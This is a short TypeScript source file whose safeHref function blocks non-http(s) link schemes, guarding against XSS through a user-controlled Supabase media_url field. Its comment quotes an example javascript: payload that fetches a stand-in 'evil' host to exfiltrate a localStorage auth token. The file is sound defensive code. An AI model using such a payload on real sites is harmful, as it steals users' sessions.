// Guard href/src values that may carry attacker-controlled content. A message's
// `media_url` is a free-form column any user can set to an arbitrary string via
// the Supabase REST API (RLS lets you insert your own messages), so a hostile
// value like `javascript:fetch('//evil/'+localStorage.getItem('sb-...-auth-token'))`
// would run in the victim's origin when they click the file link. React does not
// block `javascript:` hrefs (dev-warns only), so we validate the scheme here.
//
// Only http(s) is allowed through; anything else (javascript:, data:, vbscript:,
// blob: as a link, …) returns undefined so the element renders inert. Legitimate
// Supabase storage URLs are always https, so this never blocks real attachments.
export function safeHref(u?: string | null): string | undefined {
  if (!u) return undefined;
  try {
    const { protocol } = new URL(u, window.location.origin);
    return protocol === 'http:' || protocol === 'https:' ? u : undefined;
  } catch {
    return undefined;
  }
}
